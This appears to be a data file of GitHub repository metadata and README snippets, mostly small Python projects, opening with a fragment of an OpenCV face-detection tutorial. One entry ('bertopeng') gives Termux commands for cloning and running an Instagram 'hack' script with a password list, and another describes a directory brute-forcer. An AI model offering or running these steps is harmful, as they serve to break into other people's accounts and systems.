Using Jupyter notebooks OpenCV Using Python Scripts Savings images  Basic Operation on Images In this section, we will learn how we can draw various shapes on an existing image to get a flavour of working with OpenCV.  Drawing on Images Functions & Attributes Writing on Images  Face Detection Face detection is a technique that identifies or locates human faces in digital images. A typical example of face detection occurs when we take photographs through our smartphones, and it instantly detects faces in the picture. Face detection is different from Face recognition. Face detection detects merely the presence of faces in an image while facial recognition involves identifying whose face it is. Face detection is performed by using classifiers. A classifier is essentially an algorithm that decides whether a given image is positive(face) or negative(not a face). A classifier needs to be trained on thousands of images with and without faces. Fortunately, OpenCV already has two pre-trained face detection classifiers, which can readily be used in a program. The two classifiers are: Haar Classifier and Local Binary Pattern(LBP) classifier. Haar feature-based cascade classifiers  1. 'Haar features' extraction 2. 'Integral Images' concept 3. 'Adaboost': to improve classifier accuracy 4. Using 'Cascade of Classifiers' Face Detection with OpenCV-Python  
418031818;WEEK-6---Machine-Learning-with-Python;https://github.com/jngm-macalintal/WEEK-6---Machine-Learning-with-Python;Jupyter Notebook;2021-10-17T05:38:07Z;0;0;0;
418036024;intro-to-ctrl-eng-with-python;https://github.com/KakeruHashimoto/intro-to-ctrl-eng-with-python;;2021-10-17T06:01:26Z;0;0;0;intro-to-ctrl-eng-with-python 「Pythonによる制御工学入門」の勉強用です。 環境構築（Windows） 「slycot」のインストール時にエラーが発生する。Macだと問題ないらしい。 pip install slycot  でエラーが発生。 ERROR: Failed building wheel for slycot Failed to build slycot ERROR: Could not build wheels for slycot which use PEP 517 and cannot be installed directly  ↓を参考に解決（pipのバージョンは要確認） https://note.com/tomtom_0301/n/na8fedf6f87ee 
417989634;Understanding-and-Visualizing-Data-with-Python;https://github.com/Leahvv/Understanding-and-Visualizing-Data-with-Python;Jupyter Notebook;2021-10-17T01:25:40Z;0;0;0;
417986734;Spotify-Music-Data-EDA-With-Python;https://github.com/sankaramoctar/Spotify-Music-Data-EDA-With-Python;Jupyter Notebook;2021-10-17T01:03:53Z;0;0;0;
417999599;Lambdas-y-Manejo-de-Errores-python;https://github.com/duvanbotello/Lambdas-y-Manejo-de-Errores-python;;2021-10-17T02:30:45Z;0;0;0;
418020062;TrySTH;https://github.com/Lorces/TrySTH;Python;2021-10-17T04:36:21Z;0;0;0;日常编程项目：TrySTH 本项目为使用Python提高日常科研工作效率与完成课程作业的编程娱乐项目。目前包括水波动力学课程作业、实现经典排序算法、获取文献图中数据等内容。 wave 水波动力学课程作业，绘制给定波长水波运动流场云图动画、速度场矢量图动画及水质点运动轨迹图动画。使用matplotlib绘制时间序列逐帧图，ImageMagic完成动画渲染。 水波运动流场云图与速度矢量图动画参考：wave motion  水质点运动轨迹图动画参考：particle trajectory  OBS 水波动力学课程作业，利用某海域海底监测器一段时间的监测数据计算受力与加速度的关系。 数据分析结果参考：  sorting 实现各类经典排序算法的小项目，探索中...  bubble_sort：冒泡排序 choose_sort：选择排序  data_structure 实现各类经典数据结构的小项目，探索中...  Stack：栈（LIFO） Queue：队列（FIFO） Deque：双向队列 BinaryTree：二叉树 Graph：简易图结构  get_data 获取文献实验结果图中原始数据，使用OpenCV开发，更多功能待实现中... genshin 《原神》角色伤害期望简易计算器，实现基础元素反应伤害计算，更多功能待实现中... 
418012144;translator-machine.py;https://github.com/luodiw/translator-machine.py;Python;2021-10-17T03:50:56Z;0;0;0;
417979820;dadagenerator;https://github.com/ealfox/dadagenerator;Python;2021-10-17T00:20:36Z;0;0;0;"dadagenerator A simple program for generating dadaist poems. Sometimes manages to even make a rhyme. This started as a literature homework. The task was to bring some newspaper to school so we can try to create a dada poem using cut out words. But seriously, who reads newspaper in 21st century? I didn't have any, I always read news online. So... Improvise. Adapt. Overcome. Created a really simple program that was randomly choosing words from an article and put it into something looking like a poem. Later I worked a bit more and added randomness to more factors (since dadaism should be random), the possibility to set the number of stanzas/verses/words (but lol, you won't affect the final result that much) and also the rhyme feature. Whatever you want your poem to be generated from (should be a text, the longer the better the chances of getting some cool stuff), put it into the txt doc called ""dadadata"" (or anything else but don't forget to change the code). Right now it contains the text you're currently reading so I recommend to change it before you run the program. Not sure about the results in different languages. Rhymes are created by words with the same last two letters here, it works fine in my native language but english has different pronounciation and it most likely won't be that good. But seriously who cares, it's dada, it doesn't need rhymes. "
417999994;pose_tracking;https://github.com/thotsaporn-mo/pose_tracking;Python;2021-10-17T02:32:50Z;0;0;0;pose_tracking python code for AI Training 
417982775;codefresh-contrib;https://github.com/noenif6/codefresh-contrib;;2021-10-17T00:37:58Z;0;0;0;codefresh-contrib Dockerized Python Flask Example application 
417992510;PrivacyFHE;https://github.com/thewires2/PrivacyFHE;;2021-10-17T01:47:19Z;0;0;0;
418022421;Sportsdata;https://github.com/abhishek213-alb/Sportsdata;Python;2021-10-17T04:48:46Z;0;0;0;Sportsdata Obtains score data using python 
418016604;pyartificialintelligence;https://github.com/DoctorStange4325/pyartificialintelligence;Python;2021-10-17T04:17:38Z;0;0;0;Hi Guys This is A.I Project for python enjoy using aivoice aivoice (0.0.1) 
418028007;Restaurant-Management-System;https://github.com/sunandgarg/Restaurant-Management-System;;2021-10-17T05:18:07Z;0;0;0;Restaurant-Management-System Restaurant Management System using Python 
418037970;eureka;https://github.com/dribeiroferr/eureka;;2021-10-17T06:11:16Z;0;0;0;"python-crud-rest-api-dockerized  Sorry, repository is in maintenance.   Table of contents Project Phases  Description  Before We Get Started  Architechture  Data Structure  What is Docker ?  Get started  Routes  Security  What's Next ?   Project Phases   pre-development  development  tests  release v 1.0   Description This project was developed due academic reasons and developed all by myself. Let me explain what it is: This is a CRUD (Create, Read, Update, Delete) REST (Representational State Transfer) API (Application Programing Interface) that will run in Docker developed in python 3.9. The database choosen for this project was PostgreSQL and it is linked to a real remote database just to make this project more realistic. If it was a ""real world application"" these data would be protected by environmental variables and it would be added to .gitignore file.  Before We Get Started As I mentioned before this application is dockerized, with that in mind you will need to setup docker in your machine, if it is not installed.  Architechture Sorry we are working on docummentation and it will be available as soon as possible, wheb it is done.  Data Structure Sorry we are working on docummentation and it will be available as soon as possible, wheb it is done.  What is Docker ? Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. With Docker, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of Docker methodologies for shipping, testing, and deploying code quickly, you can significantly reduce the delay between writing code and running it in production. You will need to download the following:  Docker more... (this doc is in maintenance yet)   Get Started Sorry we are working on docummentation and it will be available as soon as possible, wheb it is done.  Starting The Application Sorry we are working on docummentation and it will be available as soon as possible, wheb it is done.  Routes Sorry we are working on docummentation and it will be available as soon as possible, wheb it is done.  Security Sorry we are working on docummentation and it will be available as soon as possible, wheb it is done.  What's next ? Sorry we are working on docummentation and it will be available as soon as possible, wheb it is done.   @dribeiroferr  "
418019223;pybrainfuck;https://github.com/atamaokac/pybrainfuck;Python;2021-10-17T04:32:06Z;0;0;0;
418005704;Trevel-Agent;https://github.com/dannniell/Trevel-Agent;Python;2021-10-17T03:07:50Z;0;0;0;
418018792;NoodleExtensions.py-api;https://github.com/no-u101/NoodleExtensions.py-api;Python;2021-10-17T04:29:54Z;0;0;0;NoodleExtensions.py-api a beat saber python api 
418028560;viper;https://github.com/greentfrapp/viper;;2021-10-17T05:21:11Z;0;0;0;viper Build your frontend with Python 
418025582;yokawasao;https://github.com/LoveAurora6/yokawasao;;2021-10-17T05:04:59Z;0;0;0;
417991847;Study;https://github.com/captaindamien/Study;Python;2021-10-17T01:42:22Z;0;0;0;Study Сontains homework assignments in several subjects that were taken at the github 
418033615;Khobor24hour-newspaper-development-website-in-Python-Django;https://github.com/lalchan123/Khobor24hour-newspaper-development-website-in-Python-Django;Tcl;2021-10-17T05:47:58Z;0;0;0;
418029825;todo;https://github.com/waruiz/todo;Python;2021-10-17T05:27:56Z;0;0;0;
418008990;abrombergl;https://github.com/thoongnvl/abrombergl;;2021-10-17T03:29:50Z;0;0;0;
418036470;alien_invasion;https://github.com/aryaman-27/alien_invasion;;2021-10-17T06:03:30Z;0;0;0;alien_invasion Alien invasion game while studying python 
417993430;unrealmind;https://github.com/sabrt00th/unrealmind;Python;2021-10-17T01:54:17Z;0;0;0;unrealmind Machine Learning With Python For Dummies™️ In a nutshell, this was my IB Personal Project for Year 11, where I used Python to create a neural network that could recognise Lego brick models despite differing positions and colours. It was pain then, and it's still pain today, but at least now I have it set in stone that I did something noteworthy with my life. Hot tip: you need to put the code in blenderender.txt into Blender's 'scripting' tab for this whole thing to work. Just a heads up. 
418018818;BattlesnakeOfficiali;https://github.com/vinhnxvw/BattlesnakeOfficiali;;2021-10-17T04:30:03Z;0;0;0;BattlesnakeOfficiali A simple Battlesnake written in Python. 
418022764;hellosign5;https://github.com/Sacrifyh/hellosign5;;2021-10-17T04:50:44Z;0;0;0;
417979053;Curso_Django;https://github.com/flan6/Curso_Django;JavaScript;2021-10-17T00:15:27Z;0;0;0;
418007144;Another-World;https://github.com/julia-fomichova/Another-World;Python;2021-10-17T03:17:07Z;0;0;0;
418016826;py-https-server;https://github.com/mariosubspace/py-https-server;Python;2021-10-17T04:18:50Z;0;0;0;
417985218;VCU;https://github.com/Jalil84/VCU;;2021-10-17T00:53:29Z;0;0;0;VCU This is my VCU Python class scripts 
417985596;LicenseServer;https://github.com/TheRed2399/LicenseServer;Python;2021-10-17T00:56:28Z;0;0;0;LicenseServer My crappy License Server made in Python 
418034434;DiscountCalculator;https://github.com/sakthiprasathanbu/DiscountCalculator;Python;2021-10-17T05:52:47Z;0;0;0;DiscountCalculator This is a Discount calculator application using python And also available as --> Tkinter python desktop application --> Kivy mobile application... 
418019404;CFD-Tools;https://github.com/Lorces/CFD-Tools;Python;2021-10-17T04:32:59Z;0;0;0;CFD-Tools 本项目为计算流体力学程序HydroFlow-IBM辅助工具开发，主要包括文件预处理、数据分析、计算结果可视化与操作界面优化。 计算程序HydroFlow-IBM使用Fortran77编写，主要应用于模拟大尺度环境流动、浅水波浪、溶质扩散、复杂地形表面流动等流体力学问题。现拟增加基于浸入边界法的新计算模块，同时完成程序操作界面开发。 Mesh 网格生成程序MixGrid数据文件编写及简易可视化。  rect_mesh   结构化网格文件生成。输入参数包括：矩形计算域顶点，x方向分隔点数，y方向分隔点数。   unst_mesh   非结构网格文件生成，通常计算域包含外边界与内边界，但内边界不是必须。输入参数包括：外边界信息，通常为矩形计算域总分隔点及每一点坐标，要求逆时针连续；内边界信息，可为任意边界，同样为总分隔点及每一点坐标，逆时针连续。   ib_2D   二维虚拟离散边界点生成，可为任意形状。输入参数包括：边界信息，即总分隔点与每一点坐标，可任意连续。   ib_3D   三维虚拟离散边界点生成，通过ICFM-CFD几何建模，针对生成的msh文件修改，使其成为HydroFlow-IBM可读网格文件格式。  Modify 计算文件预处理，包括头文件信息修改、网格文件修改、边界条件设置等部分。  get_paras   从原始网格几何信息文件中读取指定参数，主要参数包括：网格单元总数IJM、网格点总数IJP、网格单元边总数IJE等。   modify_cuv，modify_grd，modify_inf   修改原始网格文件，使其符合程序计算读入规则，修改后用于程序计算的网格几何信息文件命名为OCERM.CUV，OCERM.GRD。其中CUV文件包含各单元所有局部几何信息，GRD文件包含单元位置与水深信息。INF文件为计算程序头文件。   modify_qbc，modify_ebc   修改边界条件信息，QBC后缀文件为入口边界条件信息，包括流速与湍粘性系数，需从已经计算好的结果中读取。EBC后缀文件为出口边界条件信息，包括水位与湍粘性系数，根据需要人为设定完成。   create_qbc   创建初始入口边界条件文件，用于在计算前迭代分层流量等信息，通常以两个网格作为水平入口。   set_kb   设置垂向分层信息，可使用不均匀分层。不均匀分层目前通过等比数项生成。  Visualization 虚拟边界可视化模块，用于识别不同标签的计算单元，分为二维边界、三维边界、静止边界、运动边界等部分。  数据文件格式   原始数据文件位置为Output/Figure文件夹，包含fluid，solid，ibc，ibn四个部分，分别代表计算域中的流体单元、固体单元、虚拟域单元与虚拟边界。文件格式均为目标点的三维位置坐标，数据格式3F8.4。   应用模块   虚拟边界识别可视化基于matplotlib开发，支持静止二维三维边界直观可视化，运动二维边界简易动画查看。  Uplot 流场速度结果后处理模块，主要绘制数值计算与实验结果对比图。  u_mid   主要用于绘制半水深处圆柱绕流沿直径径向速度分布图与监测点速度随时间变化图，可与已有文献实验数据对比。   u_boundary   底边界近壁处速度分布剖面，包含粘性底层区、过渡区与对数分布区，由于观测流量边界条件是否合理。   u_Cp, u_CDCL   无量纲压力系数、阻力系数与升力系数数值计算与实验结果对比图绘制，目前主要对比不同雷诺数下圆柱绕流的无量纲参数。  
418015831;TIC-TAC-TOE-GAME;https://github.com/shuvajitbanerjee/TIC-TAC-TOE-GAME;Python;2021-10-17T04:13:47Z;0;0;0;TIC-TAC-TOE-GAME It is just a funny game .made using python programming language.it have two player X and O . 
417997854;Pokemon-Battle-Simulator;https://github.com/vmalabanan/Pokemon-Battle-Simulator;Python;2021-10-17T02:21:04Z;0;0;0;Pokemon Battle Simulator A text-based Pokemon battle simulator written in Python. The battling Pokemon rosters: myParty.json and rivalParty.json. Originally submitted as a final project in an Introduction to Python class. 
418018221;A-I-For-Py;https://github.com/SakshamProHecker/A-I-For-Py;Python;2021-10-17T04:26:55Z;0;0;0;
417981032;dataset;https://github.com/papismurf/dataset;Jupyter Notebook;2021-10-17T00:26:45Z;0;0;0;dataset Evaluate a GDP Dataset with Python in Jupyter Notebook 
418008758;guokre;https://github.com/thoongnvl/guokre;;2021-10-17T03:28:26Z;0;0;0;guokre a Python web framework generator supports Flask, Tornado, Falcon, Sanic 
418013123;Double-slit-simulation;https://github.com/JhoselinRam/Double-slit-simulation;Python;2021-10-17T03:57:38Z;0;0;0;
418020903;curse-sweeper;https://github.com/cjluce/curse-sweeper;Python;2021-10-17T04:41:04Z;0;0;0;"curse-sweeper What? curse-sweeper is an implementation of the classic game ""minesweeper"" in python's curses library with ""vim"" key-bindings.  Take the UI of queens  "
418029950;InteractiveScore;https://github.com/wangshouh/InteractiveScore;;2021-10-17T05:28:42Z;0;0;0;InteractiveScore A python scrpit to get zhihuishu interactive score 
418030610;video_titles;https://github.com/Jawez/video_titles;;2021-10-17T05:32:07Z;0;0;0;
418014314;gsheetapi;https://github.com/cahyadikrishna/gsheetapi;Python;2021-10-17T04:04:26Z;0;0;0;
418002708;py_switch;https://github.com/jon-edward/py_switch;Python;2021-10-17T02:50:07Z;0;0;0;py_switch A switch-case implementation using decorators in Python. 
418016953;ProgrammingHero1q;https://github.com/Grausichtf/ProgrammingHero1q;;2021-10-17T04:19:38Z;0;0;0;ProgrammingHero1q A list of python problems for beginners and intermediate developers 
418014437;discordbot-infra;https://github.com/andrew-ha/discordbot-infra;;2021-10-17T04:05:06Z;0;0;0;discordbot-infra CDK infra code to create discord bots with Python 
417998164;ankitdobhal;https://github.com/jaoxfordi/ankitdobhal;;2021-10-17T02:22:43Z;0;0;0;ankitdobhal A curated collection of some 😍 cool Python scripts. 
417993186;Funtional-Programming;https://github.com/MiaoPasss/Funtional-Programming;;2021-10-17T01:52:22Z;0;0;0;Functional Programming This repository includes all the assignments in ECE326 from Fall 2021 at University of Toronto.  Lab 1: Database Driver  Please do not copy any code directly from this repo under any circumstances(e.g. last minute of the deadline), since doing so would result in Academic Misconduct. You should only consider the general approaches to the problems on high level and implement them through your own code. Hope that you can get helped here! 
417998897;2021SpiderHomeWork;https://github.com/Ka-Xin/2021SpiderHomeWork;Jupyter Notebook;2021-10-17T02:26:18Z;0;0;0;
417992530;lthieryj;https://github.com/edudinsb/lthieryj;;2021-10-17T01:47:27Z;0;0;0;
418016137;dirbruter;https://github.com/noisyboy/dirbruter;Python;2021-10-17T04:15:21Z;0;0;0;dirbruter python3 Bruteforce directories or files using simple python3 script.   Usage:   git clone https://github.com/noisyboy/dirbruter.git pip3 install -r requirements.txt python3 dirbruter.py  
417986438;CRUD_PYODBC;https://github.com/Mizack/CRUD_PYODBC;Python;2021-10-17T01:02:00Z;0;0;0;Aplicação que realiza o CRUD básico em um banco de dados Sql Server. 
418022963;Pong;https://github.com/timmyjr11/Pong;Python;2021-10-17T04:51:42Z;0;0;0;
418016584;py-helium-console-client;https://github.com/evandiewald/py-helium-console-client;Python;2021-10-17T04:17:32Z;0;0;0; py-helium-console-client An unofficial Python Client library for the Helium Console API. Please see the API Specification for full details. Installation The package can be installed via pip: pip install py_helium_console_client Usage To use the Console API, you will first need to generate an API Key from the 'My Account' tab. Use this key to initialize the ConsoleClient class. This interface exposes any of the methods in the specification (at the time of writing), which includes programmatic access for creating, querying, and deleting devices and labels. Some example commands are shown below. See examples.py for full usage. from py_helium_console_client.client import ConsoleClient  API_KEY = 'PASTE_API_KEY_HERE'  client = ConsoleClient(API_KEY)  # list devices on account devices = client.get_devices()  # search for a device by uuid uuid_device = client.get_device_by_uuid(devices[0].id)  # get device events events = client.get_device_events(devices[0].id)  # create device created_device = client.create_device(name='python-client-test-device',                               app_key='850AFDC6F1CF2397D3FEAB8C1850E6E1',                               app_eui='B21C36EBBDC0D75F',                               dev_eui='ABA47D469E1021AF')  # list labels labels = client.get_labels()  # create label created_label = client.create_label('python-client-test-label')  # search for label by id queried_label = client.search_for_label(created_label.id)  # add label to device add_label_result = client.add_device_label(created_device.id, created_label.id)  # remove label from device remove_label_result = client.remove_device_label(created_device.id, created_label.id)  # delete device deleted_device_result = client.delete_device(created_device.id)  # delete label deleted_label_result = client.delete_label(created_label.id) Contributing This is a small project that I use for developing my own applications on the Helium Network. Please feel free to submit an issue or a PR if you find bugs or have suggestions! 
418010988;ankitdobhal7;https://github.com/kechen123x/ankitdobhal7;;2021-10-17T03:43:20Z;0;0;0;
417993234;Full-Name;https://github.com/MagnoClarence/Full-Name;;2021-10-17T01:52:46Z;0;0;0;Full-Name Assignment1, Python program which contains my full name Made by Magno, Clarence A. BSCOE 1-1 
418033297;least-square-problem;https://github.com/lepus064/least-square-problem;;2021-10-17T05:46:22Z;0;0;0;least-square-problem Example of solving least square problem with python 
418037455;donutz.bat;https://github.com/bobby-boy49/donutz.bat;Batchfile;2021-10-17T06:08:40Z;0;0;0;
418020912;fractal-api;https://github.com/phelan97/fractal-api;Python;2021-10-17T04:41:06Z;0;0;0;"About This is just a Flask playground to get a bit more familiar with the technology. Right now I have a somewhat working Mandelbrot Fractal as an API. I could add local features to this or continue to add API features/customization to the rendered images. To-do items  Generate neutral maps with just iter counts for coloring later Have customizable color maps Have somewhat adjustable iteration settings Add controls to stop spamming and validate/complete jobs properly Speed up jobs with parallelization and maybe better math or matrices This still seems to be missing some offsets and navigation tools... also things to change/preserve scaling  Other potential Python projects  Some kind of Django site or wiki Flask soil calculator API (if I don't do it entirely in a front end) IOT and web-based devices; smart watering Deck of cards API, some validation API, some other fun thing  "
418021559;Face_mask_detection;https://github.com/Sandesh-Yadav/Face_mask_detection;Python;2021-10-17T04:44:25Z;0;0;0;
418015391;jpushs;https://github.com/tankwu1978v/jpushs;;2021-10-17T04:11:01Z;0;0;0;
418024319;jpushj;https://github.com/esjs2/jpushj;;2021-10-17T04:59:18Z;0;0;0;jpushj JPush's officially supported Python client library for accessing JPush APIs. 极光推送官方支持的 Python 版本服务器端 SDK。 
418005512;bertopeng;https://github.com/sllumenikmati21/bertopeng;;2021-10-17T03:06:35Z;0;0;0;bertopeng HACK INSTAGRAM ( sosial engineering) $ apt update && apt upgrade $ pkg install python $ pkg install git  $ pkg install nano $ git clone https://github.com/bertopeng/instahack.git $ ls $ cd instahack $ ls $ pip install requests $ cd instahack $ nano pass.txt $ cat pass.txt $ ls $ python hackinsta.py Localizar ip Apt install python git git clone https://github.com/bertopeng/IPGeoLocation.git cd IPGeoLocation chmod +x ipgeoLocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t http://www.google.com Lacak IP git clone https://github.com/bertopeng/IPGeolocation cd IPGeolocation chmod +x ipgeolocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t IP yang ingin dilacak 
418011630;advinheonumero;https://github.com/ricardoamoedo/advinheonumero;Python;2021-10-17T03:47:24Z;0;0;0;
417994404;top-algorithms;https://github.com/sevillecarlos/top-algorithms;Python;2021-10-17T02:01:07Z;0;0;0;Top Algorithms Examples of top or the most used algorithms 
418000852;Qian-Han;https://github.com/vyavao/Qian-Han;;2021-10-17T02:38:45Z;0;0;0;Qian-Han Repository for coursera specialization Applied Data Science with Python by University of Michigan 
418032902;pyRC;https://github.com/ShivramS2006/pyRC;;2021-10-17T05:44:14Z;0;0;0;pyRC Python Relay Chat, a custom, open-source server system designed to emulate the Internet Relay Chat (All details listed below are plans for development. There is no guarantee that they will make it into final builds) Features  Written in Python Allows creation of multiple servers Root server for registering servers  Built on Socket.IO Object Oriented to allow easy usage Async Server and Client Open Source  License Copyright © 2021 Shivram S GNU General Public License v3 
417985429;Pytap_design;https://github.com/huyquangtranaus/Pytap_design;Python;2021-10-17T00:55:11Z;1;1;0;"Pytap_design Hướng dẫn thiết kế tạo mẫu thẻ cá nhân thông mình bằng Python '''' HƯỚNG DẪN TẠO THẺ  ""PY/ANH TAP"" MIỄN PHÍ BẰNG PYTHON  Bước đầu tiên: vào trang https://www.canva.com/, gõ từ ""professional business cards""  để chọn mẫu thẻ bạn muốn, hoặc có thể chỉnh sửa 1 mẫu nào tùy ý của bạn. (Trong ví dụ này mình dùng mẫu thẻ ở đường link này: https://www.canva.com/design/DAEtBhrh5QM/Ns8dzUbztTs2fEv-kwqMKQ/edit) Và làm theo hướng dẫn bên dưới :)) Good luck ! :)) '''  "
417984909;hangman;https://github.com/ryanmclincha/hangman;Python;2021-10-17T00:51:02Z;0;0;0;hangman a simple hangman game to mess around with python concepts learned in a programming boot camp. To run the program open the app.py using python in you terminal. 
418037174;pontos_turisticos;https://github.com/moacircostajr/pontos_turisticos;;2021-10-17T06:07:12Z;0;0;0;
418012485;NumberGussingGame;https://github.com/Badal3850/NumberGussingGame;Python;2021-10-17T03:53:02Z;0;0;0;NumberGussingGame This is a number guessing game created by a noob python programmer. xD 
418028257;opencv-inspection;https://github.com/zhang-jia-rong/opencv-inspection;;2021-10-17T05:19:32Z;0;0;0;opencv-inspection The code written in Python used OpenCV libraries to inspect parts and check for rust. 
418029083;Blender-Render-GC;https://github.com/rutforcode/Blender-Render-GC;Jupyter Notebook;2021-10-17T05:23:59Z;1;1;0;Blender-Render-GC This repository contains python scripts for Rendering Blender Projects on Google Collaborator. Setup Make sure to read the instructions carefully!  If you have other resources used in the Blender project and chose to make all paths relative, pack all of them into a zip archive. Alternatively, you can pack all external file.    blender_version : Version of blender used to render the scene.   blend_file_path : Path to the blend file after unpacking the zip archive. If blend file is used, this is automatically ignored.   upload_type : Select the type of upload method. gdrive_relative pulls everything from the folder specified.   drive_path : Path to your blend/zip file relative to the root of your Google Drive if google_drive is selected. Must state the file and its extension (.zip/.blend) unless gdrive_relative is selected.   url_blend : Specify the URL to the blend/zip file if url is selected.   animation : Specify whether animation or still image is rendered. If still image is used, put the frame number in start_frame.   start_frame, end_frame : Specify the start and end frame for animation. You may put same value such as zero for both input to set the default frame in the blend file.   download_type : Select the type of download method. gdrive_direct enables the frames to be outputted directly to Google Drive (zipping will be disabled).   output_name : Name of the output frames, do NOT include .blend! (## for frame number)   zip_files : Archive multiple animation frames automatically into a zip file.   drive_output_path : Path to your frames/zip file in Google Drive.   
418012512;jfloff4;https://github.com/night-karask/jfloff4;;2021-10-17T03:53:15Z;0;0;0;
418031719;talkpython;https://github.com/Gnencb/talkpython;;2021-10-17T05:37:36Z;0;0;0;
418013422;Simulating_disintegrating_planets;https://github.com/AndrewRidden-Harper/Simulating_disintegrating_planets;Python;2021-10-17T03:59:32Z;0;0;0;Simulating_disintegrating_planets 
418011829;Single_Cell_Analysis;https://github.com/cmorris2945/Single_Cell_Analysis;Jupyter Notebook;2021-10-17T03:48:48Z;0;0;0;Single_Cell_Analysis This is a Python script to perform downstream analysis on single cell data. It performs some quality control methods, graph charts, dimensionalty reduction and clustering.  
417993089;codingBasics;https://github.com/vikaskaushikkarora/codingBasics;Shell;2021-10-17T01:51:37Z;0;0;0;
418033811;Euler;https://github.com/seanroll/Euler;Python;2021-10-17T05:49:07Z;0;0;0;
418034806;E-to-the-Nth-Digit;https://github.com/fu4ei-python/E-to-the-Nth-Digit;Python;2021-10-17T05:54:57Z;0;0;0;E-to-the-Nth-Digit Program that generates e up to a user-specified number of decimal places. Coded in Python. Library used: Math 
418026813;cpsolns;https://github.com/AussieSeaweed/cpsolns;;2021-10-17T05:11:28Z;0;0;0;cpsolns My repository of competitive programming solutions in Python, C++, Java, et cetera. 
418035981;Probability_Statistics;https://github.com/quocchuong2405/Probability_Statistics;Jupyter Notebook;2021-10-17T06:01:17Z;0;0;0;Probability_Statistics My code for assignment probability and statistics course. Using 2 versions: Python and R programming language. 
418002593;jfloffd;https://github.com/JaviPardox1/jfloffd;;2021-10-17T02:49:16Z;0;0;0;
417997959;Proxy-Scraper;https://github.com/notqizq/Proxy-Scraper;Python;2021-10-17T02:21:41Z;0;0;0;Proxy Scraper A simple proxy scraper that utilizes the requests module in python. Usage Depending on your python installation your commands may vary. Below are the commands you should run before execution. The script was tested in python 3.8.6, using windows. git clone https://github.com/notqizq/Proxy-Scraper.git cd Proxy-Scraper pip install requests pip install colorama py main.py  
418035710;setup_repository;https://github.com/moacircostajr/setup_repository;;2021-10-17T06:00:15Z;0;0;0;nome-do-projeto Projeto desenvolvido em Python com o framework Django e Django Rest Framework, consistindo numa ferramenta de gerenciamento de ... Inicializando Estas instruções lhe permitirão obter uma cópia do projeto e executá-lo na sua máquina local para desenvolvimento e testes. Veja as notas de compilação para saber como compilar o projeto. Pré-requisitos ... Instalação Após o download deste projeto, dentro de sua pasta principal deve ser executado o comando comando, para que seja feito o download e a instalação das dependências do projeto. Após a instalação das dependências, basta executar os passos informados nas notas a seguir. Servidor de desenvolvimento Execute comando para iniciar o servidor de desenvolvimento. Acesse o endereço web http://localhost:porta/. A aplicação será atualizada automaticamente caso seja alterado o código fonte. Ferramentas de desenvolvimento ... Compilação Execute comando para compilar o projeto. O projeto compilado poderá ser encontrado no diretório ???. Use ??? para uma compilação de produção. Ajuda Para obter mais informações sobre o ... Autores  Moacir Costa - Desenvolvedor inicial  Veja também a lista de colaboradores que participam deste projeto. Licença Este projeto está licenciado sob os termos da GNU General Public License v3.0 - veja LICENSE.md para conhecer os detalhes. Agradecimentos  A Jesus Cristo, que me deu coragem e força pra chegar até aqui À minha família  Status do projeto  ...  
418036642;VizPre;https://github.com/Muffy0906/VizPre;Python;2021-10-17T06:04:21Z;0;0;0;VizPre The project is built on Python and uses Altair for plotting. VizPre uses sklearn to implement algorithms for data prediction.           VizPre.mp4      
418019300;Sentiment_Analysis_BERT;https://github.com/cmorris2945/Sentiment_Analysis_BERT;Jupyter Notebook;2021-10-17T04:32:26Z;0;0;0;Sentiment_Analysis_BERT This is  a Python program that reviews and categorizes reviews people leave about applications or other products satisfaction. This uses BERT with Pyorch. 
417993695;Portfolio;https://github.com/drozzel/Portfolio;Jupyter Notebook;2021-10-17T01:56:13Z;0;0;0;Portfolio This repository contains python file codes and Google Co Lab notebooks of the projects highlighted on my portfolio! 
418008566;smarnach;https://github.com/thoongnvl/smarnach;;2021-10-17T03:27:09Z;0;0;0;
418019736;bloody;https://github.com/0bliss/bloody;Python;2021-10-17T04:34:45Z;0;0;0;Bloody A python library for generating a Bloody Title for your application or instance. Bloody title generator that can be directly implemented to any python program. Feel free to take this for your code! Important: The title gets distorted when you try to print longer than the the width of the display!  
417977078;most_active_cookie;https://github.com/kaka21garuda/most_active_cookie;Python;2021-10-17T00:03:43Z;0;0;0;most_active_cookie a command line in python to process a csv log file and return the most active cookie for specified day. How to run: sample command: foo@bar:~ $ ./most_active_cookie cookie_log.csv -d 2018-12-09 AtY0laUfhglK3lC7 foo@bar:~ $ ./most_active_cookie cookie_log.csv -d 2018-12-08 4sMM2LxV07bPJzwf fbcn5UAVanZf6UtG SAZuXPGUrfbcn5UA 
417993041;tabela_seriea_webscraping;https://github.com/EricVenom/tabela_seriea_webscraping;Jupyter Notebook;2021-10-17T01:51:18Z;0;0;0;tabela_seriea_webscraping Um script em python que faz o web scraping da tabela da série A do brasileirão 2021. 
418006195;extraProj;https://github.com/yishawnpeng/extraProj;Python;2021-10-17T03:11:00Z;0;0;0;extraProj A web C/C++ compiler that uses the Python Flask architecture in Ubuntu system and runs on Docker container 
418005952;LearNary-Educational-Website;https://github.com/shuvajitbanerjee/LearNary-Educational-Website;CSS;2021-10-17T03:09:19Z;0;0;0;LearNary-Educational-Website it is an educational website which can use by the student and teachers can upload their own vide to teach the student.for see the project in your pc you hava to download xammp and also python and pycharm for better experience. 
418020938;Hacktoberfest-Programming;https://github.com/CodeBoy22/Hacktoberfest-Programming;C++;2021-10-17T04:41:17Z;0;0;1;Hacktoberfest-Programming This is open for everyone... 
418012239;Algoritimos_Uteis;https://github.com/joseivangeraldo/Algoritimos_Uteis;Jupyter Notebook;2021-10-17T03:51:33Z;0;0;0;Algoritimos_Uteis Algoritimos uteis e de usos rotineiros, uteis para o bom entendimento da linguagem Python.Estudantes que querem conhecer e entender a lógica de alguns códigos. 
418016530;devAmogh;https://github.com/Grausichtf/devAmogh;;2021-10-17T04:17:20Z;0;0;0;devAmogh 120+ Common code and interview problems solved in Python (it's GROWING...) Give a Star 🌟If it helps you. Please g… 
417991810;NLP-Sentiment-Analysis;https://github.com/srividya-sundaravadivelu/NLP-Sentiment-Analysis;Jupyter Notebook;2021-10-17T01:42:00Z;0;0;0;NLP-Sentiment-Analysis This project was done as part of assignment for PGP _AI DataScience using Python. This uses Naive Bayes, CountVectorizer , TF/IDF to predict the sentiment of imdb comments. 
418031444;beeware3;https://github.com/Gnencb/beeware3;;2021-10-17T05:36:04Z;0;0;0;
